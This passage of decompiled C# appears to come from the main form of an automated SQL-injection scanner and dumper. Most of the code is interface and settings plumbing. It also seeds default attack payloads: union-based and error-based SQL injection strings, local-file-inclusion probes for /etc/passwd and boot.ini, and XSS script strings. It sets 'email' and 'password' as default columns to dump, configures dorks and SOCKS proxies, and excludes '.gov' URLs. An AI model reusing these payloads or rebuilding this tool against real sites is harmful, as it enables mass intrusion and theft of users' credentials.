					goto IL_01fe;
					IL_01fe:
					num = 29;
					Globals.DG_FileInclusao = new Class29(dtgFileInclusao, Globals.TXT_PATH + "FileInclusao.txt", 2, 3);
					goto IL_0222;
					IL_0222:
					num = 30;
					Globals.DG_FileInclusao.method_12(bool_1: false);
					goto IL_0230;
					IL_0230:
					num = 31;
					dtgFileInclusao.Tag = Globals.DG_FileInclusao;
					goto IL_0243;
					IL_0243:
					num = 32;
					method_173(cmbSQLiFilter, null);
					goto IL_0253;
					IL_0253:
					num = 33;
					method_173(cmbSQLiNoInjectableFilter, null);
					goto IL_0263;
					IL_0263:
					num = 34;
					method_173(cmbFileInclusaoFilter, null);
					goto IL_0273;
					IL_0273:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_027b;
					IL_027b:
					num = 36;
					int_3 = Conversions.ToInteger(Class50.smethod_5(base.Name, "ThreadsScanner", "1"));
					goto IL_029f;
					IL_029f:
					num = 37;
					int_2 = Conversions.ToInteger(Class50.smethod_5(base.Name, "ThreadsExploit", "30"));
					goto IL_02c3;
					IL_02c3:
					num = 38;
					numSearchColumnThreads.Value = new decimal(Conversions.ToInteger(Class50.smethod_5(base.Name, numSearchColumnThreads.Name, "10")));
					goto IL_02f7;
					IL_02f7:
					num = 39;
					cmbSearchColumnType.SelectedIndex = Conversions.ToInteger(Class50.smethod_5(base.Name, cmbSearchColumnType.Name, "0"));
					goto IL_0326;
					IL_0326:
					num = 40;
					cmbSQLiSearch.Text = Conversions.ToString(Conversions.ToInteger(Class50.smethod_5(base.Name, cmbSQLiSearch.Name, "0")));
					goto IL_035a;
					IL_035a:
					num = 41;
					cmbSQLiNoInjectableSearch.SelectedIndex = Conversions.ToInteger(Class50.smethod_5(base.Name, cmbSQLiNoInjectableSearch.Name, "0"));
					goto IL_0389;
					IL_0389:
					num = 42;
					cmbFileInclusaoSearch.SelectedIndex = Conversions.ToInteger(Class50.smethod_5(base.Name, cmbFileInclusaoSearch.Name, "0"));
					goto IL_03b8;
					IL_03b8:
					num = 43;
					txtSQLiSearch.Text = Class50.smethod_5(base.Name, txtSQLiSearch.Name, "");
					goto IL_03e2;
					IL_03e2:
					num = 44;
					txtSQLiNoInjectableSearch.Text = Class50.smethod_5(base.Name, txtSQLiNoInjectableSearch.Name, "");
					goto IL_040c;
					IL_040c:
					num = 45;
					txtFileInclusaoSearch.Text = Class50.smethod_5(base.Name, txtFileInclusaoSearch.Name, "");
					goto IL_0436;
					IL_0436:
					num = 46;
					cmbSearchColumn.Text = Class50.smethod_5(base.Name, cmbSearchColumn.Name, "email");
					goto IL_0460;
					IL_0460:
					num = 47;
					cmbSearchColumn2.Text = Class50.smethod_5(base.Name, cmbSearchColumn2.Name, "password");
					goto IL_048a;
					IL_048a:
					num = 48;
					cmbSearchColumn3.Text = Class50.smethod_5(base.Name, cmbSearchColumn3.Name, "");
					goto IL_04b4;
					IL_04b4:
					num = 49;
					cmbSearchColumn4.Text = Class50.smethod_5(base.Name, cmbSearchColumn4.Name, "");
					goto IL_04de;
					IL_04de:
					num = 50;
					chkSearchColumn.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, cmbSearchColumn.Name, "True"));
					goto IL_050d;
					IL_050d:
					num = 51;
					chkSearchColumn2.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, cmbSearchColumn2.Name, "False"));
					goto IL_053c;
					IL_053c:
					num = 52;
					chkSearchColumn3.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, cmbSearchColumn3.Name, "False"));
					goto IL_056b;
					IL_056b:
					num = 53;
					chkSearchColumn4.Checked = Conversions.ToBoolean(Class50.smethod_5(base.Name, cmbSearchColumn4.Name, "False"));
					goto IL_059a;
					IL_059a:
					num = 54;
					method_181(null, null);
					goto IL_05a5;
					IL_05a5:
					num = 55;
					method_182(null, null);
					goto IL_05b0;
					IL_05b0:
					num = 56;
					method_183(null, null);
					goto IL_05bb;
					IL_05bb:
					num = 57;
					method_184(null, null);
					goto IL_05c6;
					IL_05c6:
					ProjectData.ClearProjectError();
					num3 = 0;
					goto IL_05cd;
					IL_05cd:
					num = 59;
					Globals.GQueue = new Class37();
					goto IL_05da;
					IL_05da:
					num = 60;
					Globals.GQueue.method_9();
					goto IL_05e7;
					IL_05e7:
					num = 61;
					Globals.GTrash = new Class40();
					goto IL_05f4;
					end_IL_0001_2:
					break;
				}
				num = 66;
				method_93(null, null);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 1883;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_74(ToolStripComboBox toolStripComboBox_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = toolStripComboBox_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(toolStripComboBox_0.Items[i].ToString() + "|");
			}
			Class50.smethod_4(base.Name, toolStripComboBox_0.Name, stringBuilder.ToString());
			Class50.smethod_4(base.Name, toolStripComboBox_0.Name + ".Slected", toolStripComboBox_0.Text);
		}
	}

	private void method_75(ToolStripComboBox toolStripComboBox_0)
	{
		string text = Class50.smethod_5(base.Name, toolStripComboBox_0.Name, "");
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		string[] array = text.Split('|');
		foreach (string text2 in array)
		{
			if (!string.IsNullOrEmpty(text2))
			{
				toolStripComboBox_0.Items.Add(text2);
			}
		}
		toolStripComboBox_0.Text = Class50.smethod_5(base.Name, toolStripComboBox_0.Name + ".Slected", "");
	}

	private void method_76(CheckedListBox checkedListBox_0)
	{
		string text = Class50.smethod_5(base.Name, checkedListBox_0.Name, "");
		checked
		{
			if (!string.IsNullOrEmpty(text))
			{
				string[] array = text.Split('|');
				foreach (string text2 in array)
				{
					string[] array2 = text2.Split(':');
					if (array2.Length != 2)
					{
						continue;
					}
					if (((checkedListBox_0 == lstAnalizerUnion) | (checkedListBox_0 == lstAnalizerError)) && !checkedListBox_0.Items.Contains(array2[0]))
					{
						checkedListBox_0.Items.Add(array2[0]);
					}
					int num = checkedListBox_0.Items.Count - 1;
					for (int j = 0; j <= num; j++)
					{
						if (array2[0].Equals(checkedListBox_0.Items[j].ToString()))
						{
							checkedListBox_0.SetItemChecked(j, Conversions.ToBoolean(array2[1]));
							break;
						}
					}
				}
			}
			else
			{
				int num2 = checkedListBox_0.Items.Count - 1;
				for (int k = 0; k <= num2; k++)
				{
					checkedListBox_0.SetItemChecked(k, value: true);
				}
			}
		}
	}

	private void method_77(CheckedListBox checkedListBox_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = checkedListBox_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(checkedListBox_0.Items[i].ToString() + ":" + checkedListBox_0.GetItemChecked(i) + "|");
			}
			Class50.smethod_4(base.Name, checkedListBox_0.Name, stringBuilder.ToString());
		}
	}

	private void method_78(ListViewExt listViewExt_0)
	{
		string text = ((listViewExt_0 == lvwLFIpathLinux) ? Class50.smethod_5(base.Name, listViewExt_0.Name, "/etc/passwd#root:/bin/bash|") : ((listViewExt_0 == lvwLFIpathWin) ? Class50.smethod_5(base.Name, listViewExt_0.Name, "c:\\\\boot.ini#default=multi(|d:\\\\boot.ini#default=multi(|c://boot.ini#default=multi(|d://boot.ini#default=multi(|") : ((listViewExt_0 == lvwWafs) ? Class50.smethod_5(base.Name, listViewExt_0.Name, "#%00") : ((listViewExt_0 != lvwXSS) ? Class50.smethod_5(base.Name, listViewExt_0.Name, "") : Class50.smethod_5(base.Name, listViewExt_0.Name, "\"><script >alert(String.fromCharCode(88,83,83))</script>#XSS|\"><javascript:alert(String.fromCharCode(88,83,83));\">#XSS")))));
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		string[] array = text.Split('|');
		checked
		{
			foreach (string text2 in array)
			{
				if (!string.IsNullOrEmpty(text2))
				{
					string[] array2 = text2.Split('#');
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.Text = array2[0];
					int num = array2.Length - 1;
					for (int j = 1; j <= num; j++)
					{
						listViewItem.SubItems.Add(array2[j]);
					}
					listViewExt_0.Items.Add(listViewItem);
				}
			}
		}
	}

	private void method_79(ListViewExt listViewExt_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = listViewExt_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(listViewExt_0.Items[i].Text);
				int num2 = listViewExt_0.Columns.Count - 1;
				for (int j = 1; j <= num2; j++)
				{
					stringBuilder.Append("#" + listViewExt_0.Items[i].SubItems[j].Text);
				}
				stringBuilder.Append("|");
			}
			Class50.smethod_4(base.Name, listViewExt_0.Name, stringBuilder.ToString());
		}
	}

	private void method_80(ListBox listBox_0)
	{
		string text = ((listBox_0 != lstExcludeUrlWords) ? Class50.smethod_5(base.Name, listBox_0.Name, "") : Class50.smethod_5(base.Name, listBox_0.Name, "forum|showthread|.viewforum|.viewtopic|injection|dorks|union|hack|.gov"));
		string[] array = text.Split('|');
		foreach (string text2 in array)
		{
			if (!string.IsNullOrEmpty(text2) && !listBox_0.Items.Contains(text2))
			{
				listBox_0.Items.Add(text2);
			}
		}
	}

	private void method_81(ListBox listBox_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = listBox_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(listBox_0.Items[i].ToString() + "|");
			}
			Class50.smethod_4(base.Name, listBox_0.Name, stringBuilder.ToString());
		}
	}

	public MemoryStream Descompress(Stream stream)
	{
		int num = Convert.ToInt32(stream.Length);
		byte[] array = new byte[checked(num + 1)];
		stream.Read(array, 0, num);
		stream.Flush();
		stream.Close();
		return new MemoryStream(Descompress(array));
	}

	public byte[] Descompress(byte[] bytData)
	{
		using GZipStream gZipStream = new GZipStream(new MemoryStream(bytData), CompressionMode.Decompress);
		byte[] array = new byte[4096];
		using MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		do
		{
			num = gZipStream.Read(array, 0, 4096);
			if (num > 0)
			{
				memoryStream.Write(array, 0, num);
			}
		}
		while (num > 0);
		return memoryStream.ToArray();
	}

	private List<string> method_82(string string_5)
	{
		List<string> list = new List<string>();
		string_5 = string_5.Replace("\n", "");
		string[] array = Regex.Split(string_5, "\r");
		if (array.Length < 10000)
		{
			string[] array2 = array;
			foreach (string text in array2)
			{
				if (!string.IsNullOrEmpty(text) && !list.Contains(text))
				{
					list.Add(text);
				}
			}
		}
		else
		{
			list.AddRange(array);
		}
		return list;
	}

	private string method_83(string string_5)
	{
		string_5 = Regex.Replace(string_5, Environment.NewLine + Environment.NewLine, "");
		string_5 = Regex.Replace(string_5, "\r\n\r\n", "");
		string_5 = Regex.Replace(string_5, "\r\r", "");
		string_5 = Regex.Replace(string_5, "\t", "");
		string_5 = Regex.Replace(string_5, " ", "");
		return string_5;
	}

	private int method_84(string string_5)
	{
		if (string_5.Length <= 2)
		{
			return 0;
		}
		int num = string_5.Split('\r').Length;
		checked
		{
			if (string_5.Substring(string_5.Length - 2, 1).Equals("\r"))
			{
				num--;
			}
			return num;
		}
	}

	internal IPAddress method_85(string string_5)
	{
		IPAddress result;
		try
		{
			IPHostEntry iPHostEntry = null;
			try
			{
				iPHostEntry = Dns.GetHostEntry(string_5);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				if (!string_5.StartsWith("www."))
				{
					iPHostEntry = Dns.GetHostEntry("www." + string_5);
				}
				ProjectData.ClearProjectError();
			}
			if (iPHostEntry != null)
			{
				IPAddress[] addressList = iPHostEntry.AddressList;
				int num = 0;
				while (num < addressList.Length)
				{
					IPAddress iPAddress = addressList[num];
					if (iPAddress.AddressFamily != AddressFamily.InterNetwork)
					{
						num = checked(num + 1);
						continue;
					}
					result = iPAddress;
					goto end_IL_0001;
				}
			}
			result = null;
			end_IL_0001:;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			result = null;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private int method_86(string string_5)
	{
		int num = default(int);
		using (StreamReader streamReader = new StreamReader(string_5))
		{
			while (!streamReader.EndOfStream)
			{
				streamReader.ReadLine();
				num = checked(num + 1);
			}
			streamReader.Close();
		}
		return num;
	}

	private string method_87(string string_5, int int_14 = 10000)
	{
		FileInfo fileInfo = new FileInfo(string_5);
		StringBuilder stringBuilder = new StringBuilder();
		using (StreamReader streamReader = fileInfo.OpenText())
		{
			int num = default(int);
			while (!streamReader.EndOfStream)
			{
				string value = streamReader.ReadLine();
				if (string.IsNullOrEmpty(stringBuilder.ToString()))
				{
					stringBuilder.Append(value);
				}
				else
				{
					stringBuilder.AppendLine(value);
				}
				num = checked(num + 1);
				if (num > int_14)
				{
					break;
				}
			}
			streamReader.Close();
		}
		return stringBuilder.ToString();
	}

	private void method_88()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Image oImage = default(Image);
		string sCountryCode = default(string);
		string text = default(string);
		string sCountry = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 316:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001c;
						case 4:
							goto IL_003a;
						case 5:
							goto IL_0042;
						case 6:
							goto IL_0047;
						case 7:
							goto IL_0054;
						case 8:
							goto IL_0068;
						case 9:
							goto IL_0078;
						case 11:
							goto IL_0089;
						case 12:
							goto IL_0099;
						case 15:
							goto IL_00bb;
						case 16:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 10:
						case 13:
						case 14:
						case 17:
						case 18:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0089:
					num = 11;
					lblIP.Image = oImage;
					goto IL_0099;
					IL_0099:
					num = 12;
					lblIP.Text = "[" + sCountryCode + "] " + text;
					goto end_IL_0001_3;
					IL_0078:
					num = 9;
					lblIP.Text = text;
					goto end_IL_0001_3;
					IL_00bb:
					num = 15;
					lblIP.Image = null;
					break;
					IL_000a:
					num = 2;
					text = new WebClient().DownloadString("http://checkip.dyndns.org/");
					goto IL_001c;
					IL_001c:
					num = 3;
					text = new Regex("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}").Matches(text)[0].ToString();
					goto IL_003a;
					IL_003a:
					num = 4;
					sCountry = "";
					goto IL_0042;
					IL_0042:
					num = 5;
					oImage = null;
					goto IL_0047;
					IL_0047:
					num = 6;
					if (!string.IsNullOrEmpty(text))
					{
						goto IL_0054;
					}
					goto IL_00bb;
					IL_0054:
					num = 7;
					Globals.G_DataGP.Lookup(text, ref sCountry, ref oImage, ref sCountryCode, bUnionContryCode: true);
					goto IL_0068;
					IL_0068:
					num = 8;
					if (sCountryCode.Equals("--"))
					{
						goto IL_0078;
					}
					goto IL_0089;
					end_IL_0001_2:
					break;
				}
				num = 16;
				lblIP.Text = "";
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 316;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_89(object sender, EventArgs e)
	{
		method_88();
	}

	private void method_90(object sender, EventArgs e)
	{
		grbDorks.Visible = !chkHideDork.Checked;
	}

	private void method_91(object sender, EventArgs e)
	{
		txtUserAgent.Text = txtUserAgent.Text.Trim();
		if (string.IsNullOrEmpty(txtUserAgent.Text))
		{
			txtUserAgent.Text = "Mozilla/ 5.0(Windows NT 10.0; WOW64; rv: 50.0) Gecko/20100101 Firefox/50.0";
		}
	}

	private void method_92(object sender, EventArgs e)
	{
		txtAccept.Text = txtAccept.Text.Trim();
		if (string.IsNullOrEmpty(txtAccept.Text))
		{
			txtAccept.Text = "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8";
		}
	}

	private void method_93(object sender, EventArgs e)
	{
		if (sender != null)
		{
			NewLateBinding.LateSet(sender, null, "SelectedItem", new object[1], null, null);
		}
		checked
		{
			if (lstAnalizerUnion.Items.Count == 0)
			{
				string[] array = new string[10] { "' union all select [t] and '1'='1", "999999.9 union all select [t]", "999999.9 union all select [t]--", " and 1'='1' union all select [t] and '1'='1", " or 1'='1' union all select [t] and '1'='1", "999999.9' union all select [t] and '1'='1", "999999.9) union all select [t] and (1=1", "999999.9) union all select [t] and (1=1", " and 1=1 union all select [t]", " or 1=1 union all select [t]" };
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					lstAnalizerUnion.Items.Add(array[i], i < 6);
				}
			}
			if (lstAnalizerError.Items.Count == 0)
			{
				string[] array2 = new string[11]
				{
					"' and [t] and '1'='1", "' or [t] and '1'='1", "[t]", " and 1=[t] and 1=1", " or 1=[t] and 1=1", "' and 1=[t] and '1'='1", "' or 1=[t] and '1'='1", "' and [t] and '1'='1", "' or [t] and '1'='1", "[t]--",
					" and 1=[t] and 1=1--"
				};
				int num2 = array2.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					lstAnalizerError.Items.Add(array2[j], j < 9);
				}
			}
		}
	}

	private void method_94(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(txtAnalizerExploitCode.Text))
		{
			txtAnalizerExploitCode.Text = "'[0]";
		}
	}

	private void method_95(object sender, EventArgs e)
	{
		numAnalizerUnionEnd.Minimum = decimal.Add(numAnalizerUnionSart.Value, 1m);
		numAnalizerUnionSart.Maximum = decimal.Subtract(numAnalizerUnionEnd.Value, 1m);
	}

	private void method_96(object sender, EventArgs e)
	{
		Globals.G_SOCKS.UseMyIP = btnSocksMyIP.Checked;
	}

	private void method_97(object sender, EventArgs e)
	{
		if (numThreads.Tag == null)
		{
			return;
		}
		if (bool_3)
		{
			if (mdiTabControl != null)
			{
				if (uxTabControl_0.SelectedIndex == 0)
				{
					int_3 = Convert.ToInt32(numThreads.Value);
				}
				else if ((uxTabControl_0.SelectedIndex == 1) | (uxTabControl_0.SelectedIndex == 2))
				{
					int_2 = Convert.ToInt32(numThreads.Value);
				}
				if (threadPool_0 != null)
				{
					threadPool_0.MaxThreadCount = Convert.ToInt32(numThreads.Value);
				}
			}
		}
		else if (twMain.SelectedNode != null)
		{
			if (twMain.SelectedNode == treeNode_0)
			{
				int_3 = Convert.ToInt32(numThreads.Value);
			}
			else if ((twMain.SelectedNode == treeNode_4) | (twMain.SelectedNode == treeNode_1))
			{
				int_2 = Convert.ToInt32(numThreads.Value);
			}
			if (threadPool_0 != null)
			{
				threadPool_0.MaxThreadCount = Convert.ToInt32(numThreads.Value);
			}
		}
	}

	private void method_98(object sender, EventArgs e)
	{
		if (enum6_0 == Enum6.const_4 && threadPool_0 != null)
		{
			threadPool_0.MaxThreadCount = Convert.ToInt32(numSearchColumnThreads.Value);
		}
	}

	private void method_99(object sender, CancelEventArgs e)
	{
		e.Cancel = (lvwScannerDomain.SelectedItems.Count != 1) | (enum6_0 == Enum6.const_1);
	}

	private void method_100(object sender, EventArgs e)
	{
		ListViewItem listViewItem = lvwScannerDomain.SelectedItems[0];
		using (ImpBox impBox = new ImpBox())
		{
			impBox.MinLengh = 2;
			impBox.txtValue.MaxLength = 3;
			impBox.txtValue.CharacterCasing = CharacterCasing.Lower;
			impBox.Text = Globals.translate_0.GetStr(this, 71) + listViewItem.Text;
			impBox.txtValue.Text = listViewItem.SubItems[1].Text;
			if (impBox.ShowDialog(this) == DialogResult.OK)
			{
				listViewItem.SubItems[1].Text = impBox.txtValue.Text;
			}
		}
		listViewItem = null;
	}

	private void method_101(object sender, EventArgs e)
	{
		cmbUpdater.Enabled = chkUpdater.Checked;
	}

	private void method_102(object sender, EventArgs e)
	{
		if (Operators.CompareString(btnXmlImport8x.Text, "Cancel", TextCompare: false) == 0)
		{
			bckImport.CancelAsync();
			btnXmlImport8x.Enabled = false;
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Multiselect = false;
		openFileDialog.Filter = "XML File|*.xml";
		openFileDialog.Title = "Open 'URL Injectables.xml'";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			btnXmlImport8x.Text = "Cancel";
			prbImport.Value = 0;
			bckImport.RunWorkerAsync(openFileDialog.FileName);
		}
	}

	private void method_103(object sender, DoWorkEventArgs e)
	{
		checked
		{
			try
			{
				string fileName = Conversions.ToString(e.Argument);
				int num = 0;
				List<Class29.Class30> list = new List<Class29.Class30>();
				DataTable dataTable = new DataTable("Item");
				dataTable.BeginLoadData();
				int num2 = 0;
				do
				{
					DataColumn dataColumn = new DataColumn();
					dataColumn.DataType = typeof(string);
					dataColumn.ColumnName = "C" + (num2 + 1).ToString().PadLeft(2, '0');
					dataTable.Columns.Add(dataColumn);
					if (num2 == 0)
					{
						dataTable.PrimaryKey = new DataColumn[1] { dataColumn };
					}
					num2++;
				}
				while (num2 <= 9);
				dataTable.ReadXml(fileName);
				int num3 = dataTable.Rows.Count - 1;
				for (int i = 0; i <= num3; i++)
				{
					DataRow dataRow = dataTable.Rows[i];
					string text = Conversions.ToString(dataRow[0]);
					string text2 = Conversions.ToString(dataRow[1]);
					string text3 = Conversions.ToString(dataRow[3]);
					string text4 = Conversions.ToString(dataRow[2]);
					string text5 = Conversions.ToString(dataRow[9]);
					string text6 = Conversions.ToString(dataRow[7]);
					Class29.Class30 @class = new Class29.Class30(dtgSQLi);
					@class.CountryIndex = 4;
					@class.Items = new string[7] { text, text2, text3, text4, text6, "", text5 };
					if (!Globals.DG_SQLi.method_10(text))
					{
						num++;
						list.Add(@class);
					}
					dataRow = null;
					int num4 = (int)Math.Round(Math.Round((double)(100 * (i + 1)) / (double)dataTable.Rows.Count));
					method_1("[" + Globals.FormatNumbers(i + 1) + " | " + Globals.FormatNumbers(dataTable.Rows.Count) + "] " + Conversions.ToString(num4) + "% Importing please wait..");
					bckImport.ReportProgress(num4);
					if (bckImport.CancellationPending)
					{
						break;
					}
					Application.DoEvents();
				}
				dataTable.EndLoadData();
				dataTable.Dispose();
				if (num > 0)
				{
					method_1("Adding to grid " + Globals.FormatNumbers(num));
					Globals.DG_SQLi.method_17(list);
					method_1("Imported " + Globals.FormatNumbers(num) + " injectables..");
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				method_1("Import Error " + ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_104(object sender, ProgressChangedEventArgs e)
	{
		prbImport.Value = e.ProgressPercentage;
	}

	private void method_105(object sender, RunWorkerCompletedEventArgs e)
	{
		prbImport.Value = 0;
		prbImport.Enabled = false;
		btnXmlImport8x.Enabled = true;
		btnXmlImport8x.Text = "Import";
		Globals.ReleaseMemory();
	}

	private void method_106(object sender, TreeViewCancelEventArgs e)
	{
		e.Cancel = !bool_2;
	}

	private void method_107(object sender, ItemCheckEventArgs e)
	{
		if (enum6_0 == Enum6.const_1)
		{
			e.NewValue = e.CurrentValue;
		}
	}

	private void method_108(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string language = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (!bool_2)
					{
						goto end_IL_0001;
					}
					goto IL_000c;
				case 154:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001_2;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000c;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0021;
						case 5:
							goto end_IL_0001_3;
						default:
							goto end_IL_0001_2;
						case 6:
						case 7:
						case 8:
							goto end_IL_0001;
						}
						goto default;
					}
					IL_000c:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0014;
					IL_0014:
					num = 3;
					language = Globals.translate_0.GetLanguage();
					goto IL_0021;
					IL_0021:
					num = 4;
					if (language.Equals(cmbLanguages.Text))
					{
						goto end_IL_0001;
					}
					break;
					end_IL_0001_3:
					break;
				}
				num = 5;
				using (new Class8(this))
				{
					if (MessageBox.Show("To change the language, you must restart the application.\r\nДля изменения языка необходимо перезапустить приложение.", Text, MessageBoxButtons.OK, MessageBoxIcon.Question) == DialogResult.OK)
					{
					}
				}
				break;
				end_IL_0001_2:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 154;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_109(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num = default(int);
		int num2 = default(int);
		int num3 = default(int);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					num = 1;
					if (!bool_2)
					{
						goto end_IL_0001;
					}
					goto IL_000c;
				case 172:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001_2;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000c;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_0033;
						case 5:
							goto end_IL_0001_3;
						default:
							goto end_IL_0001_2;
						case 6:
						case 7:
						case 8:
							goto end_IL_0001;
						}
						goto default;
					}
					IL_000c:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0014;
					IL_0014:
					num = 3;
					text = Class50.smethod_5(base.Name, cmbGuiStyle.Name, "Tree View");
					goto IL_0033;
					IL_0033:
					num = 4;
					if (text.Equals(cmbGuiStyle.Text))
					{
						goto end_IL_0001;
					}
					break;
					end_IL_0001_3:
					break;
				}
				num = 5;
				using (new Class8(this))
				{
					if (MessageBox.Show("To change the Gui Style, you must restart the application.\r\nДля изменения внешний вид необходимо перезапустить приложение.", Text, MessageBoxButtons.OK, MessageBoxIcon.Question) == DialogResult.OK)
					{
					}
				}
				break;
				end_IL_0001_2:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 172;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_110(object sender, EventArgs e)
	{
		TextBox textBox = (TextBox)sender;
		if (textBox.Text.StartsWith(" ") | textBox.Text.EndsWith(" "))
		{
			textBox.Text = textBox.Text.Trim();
		}
	}

	private void method_111(object sender, EventArgs e)
	{
		tpLfiWin.Enabled = !chkLfiWindowsSkip.Checked;
	}

	private void method_112(object sender, ItemCheckEventArgs e)
	{
		if ((enum6_0 == Enum6.const_2) | (enum6_0 == Enum6.const_3))
		{
			e.NewValue = e.CurrentValue;
		}
	}

	private void method_113(object sender, EventArgs e)
	{
		checked
		{
			int num = lstExpoitType.Items.Count - 1;
			bool itemChecked = default(bool);
			for (int i = 0; i <= num; i++)
			{
				if (itemChecked = lstExpoitType.GetItemChecked(i))
				{
					break;
				}
			}
			if (!itemChecked)
			{
				lstExpoitType.SetItemChecked(0, value: true);
			}
			lstExpoitType.SelectedItem = null;
		}
	}

	private void method_114(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(sender, null, "SelectedItem", new object[1], null, null);
	}

	private void method_115(object sender, EventArgs e)
	{
		if (txtExcludeUrlWords.Text.Contains(" "))
		{
			txtExcludeUrlWords.Text = txtExcludeUrlWords.Text.Replace(" ", "");
		}
		btnExcludeUrlWords.Enabled = !string.IsNullOrEmpty(txtExcludeUrlWords.Text);
	}

	private void method_116(object sender, EventArgs e)
	{
		if (sender == btnExcludeUrlWords)
		{
			TextBox textBox = txtExcludeUrlWords;
			ListBox listBox = lstExcludeUrlWords;
			if (!string.IsNullOrEmpty(textBox.Text) && !listBox.Items.Contains(textBox.Text))
			{
				textBox.Focus();
				listBox.Items.Add(textBox.Text);
				listBox.TopIndex = checked(listBox.Items.Count - 1);
			}
			textBox.Text = "";
		}
	}

	private void method_117(object sender, EventArgs e)
	{
		if (mnuExcludeUrlWords.SourceControl == lstExcludeUrlWords)
		{
			ListBox listBox = lstExcludeUrlWords;
			while (listBox.SelectedItems.Count > 0)
			{
				listBox.Items.Remove(RuntimeHelpers.GetObjectValue(listBox.SelectedItems[0]));
			}
		}
	}

	private void method_118(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 93:
					{
						num2 = num;
